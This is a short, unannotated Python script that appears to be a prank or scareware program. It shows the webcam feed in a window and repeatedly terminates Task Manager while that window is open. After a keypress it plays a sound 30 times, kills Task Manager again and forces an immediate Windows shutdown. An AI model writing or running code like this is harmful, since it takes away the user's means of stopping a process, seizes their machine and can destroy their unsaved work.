import cv2
import argparse
import pygame
import time
import psutil
import os
pygame. mixer. init()
cap = cv2.VideoCapture(0)
for i in range(30):
    cap.read()
while True:
    ret, frame = cap.read()
    cv2.imshow('video feed', frame)
    if cv2.waitKey(1) & 0xFF == ord('z'):
        break
    for proc in psutil.process_iter():
        if proc.name().lower() == 'taskmgr.exe':
            proc.terminate()    
while True:
    for i in range(30):
        sound = pygame. mixer. Sound(r"C:\Users\User\pon.ogg")
        sound. play()
    for proc in psutil.process_iter():
        if proc.name().lower() == 'taskmgr.exe':
            proc.terminate()
    time.sleep(7)
    os.system("shutdown /s /t 0") 
cap.release()
cv2.destroyAllWindows()
